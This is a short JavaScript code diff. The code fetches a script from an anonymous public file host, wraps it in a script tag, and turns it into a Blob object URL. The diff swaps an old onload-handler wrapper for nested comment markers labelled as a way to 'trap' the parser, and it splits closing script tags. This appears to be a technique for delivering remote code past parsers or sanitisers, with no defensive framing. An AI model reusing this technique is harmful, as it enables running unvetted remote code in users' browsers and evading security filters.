@@ -9,9 +9,17 @@
     fetch('https://files.catbox.moe/cwedrd.js')
       .then(res => res.text())
       .then(js => {
-        const htmlWrapper = `<script language="Javascript1.1" for=window event=onload>` +
-          js.split('</script>').join('</scr' + 'ipt>') +
-          `</script>`;
+        const htmlWrapper = `
+          <script>
+            /* Open comment to trap parser
+            <script>
+            */ 
+            ${js.split('</script>').join('</scr' + 'ipt>')}
+            /*
+            </script>
+            Close comment */
+          </script>
+        `;
   
         const blob = new Blob([htmlWrapper], { type: 'application/xml' });
         const url = URL.createObjectURL(blob);
